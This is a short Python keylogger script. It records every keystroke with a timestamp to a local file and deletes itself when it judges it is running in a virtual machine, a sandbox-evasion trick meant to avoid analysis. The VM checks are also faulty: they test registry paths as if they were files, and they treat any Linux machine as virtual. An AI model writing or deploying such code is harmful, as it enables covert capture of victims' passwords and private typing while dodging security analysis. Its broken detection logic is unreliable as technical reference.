import os
from pynput.keyboard import Listener
from datetime import datetime

file_log = 'keyloggeroutput.txt'
script_file = os.path.realpath(__file__)

import os
import platform

def is_running_in_vm():
    if platform.system() == 'Windows':
        # Check for known registry keys related to virtualization
        vm_registry_keys = [
            r"HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.",
            r"HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox",
            r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters",
            r"HKEY_LOCAL_MACHINE\SOFTWARE\Parallels\Parallels Tools",
            r"HKEY_LOCAL_MACHINE\SOFTWARE\Citrix\XenTools",
            # Add more keys for other virtualization software
        ]
        for key in vm_registry_keys:
            if os.path.exists(key):
                return True
    else:
        # For Linux, use the existing method
        vm_files = [
            '/proc/cpuinfo',
            '/sys/class/dmi/id',
            '/sys/devices/virtual/dmi/id'
        ]
        for path in vm_files:
            if os.path.exists(path):
                return True
    return False

def on_press(key):
    try:
        with open(file_log, 'a') as f:
            now = datetime.now()
            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
            f.write('{0} - {1}\n'.format(timestamp, key))
    except Exception as e:
        print('Error writing to log file:', e)

if __name__ == "__main__":
    if is_running_in_vm():
        print("Running on a virtual machine. Deleting keylogger script...")
        os.remove(script_file)
    else:
        print("Running on a physical machine. Starting keylogger...")
        with Listener(on_press=on_press) as listener:
            listener.join()
